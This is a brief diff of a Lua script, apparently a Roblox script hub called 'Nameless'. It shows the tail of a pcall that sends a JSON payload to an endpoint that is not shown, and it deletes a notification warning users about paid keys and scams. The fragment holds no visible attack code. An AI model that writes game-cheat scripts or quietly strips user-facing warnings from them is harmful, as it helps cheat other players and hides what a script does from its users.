@@ -97,9 +97,4 @@ local ok, err = pcall(function()
         Body = payloadJson
     })
 end)
-Fluent:Notify({
-    Title = "Nameless",
-    Content = "if there is a key on this script YOU HAVE BEEN SCAMMED! Please join the discord server from clipboard",
-    Duration = 3
-})
 
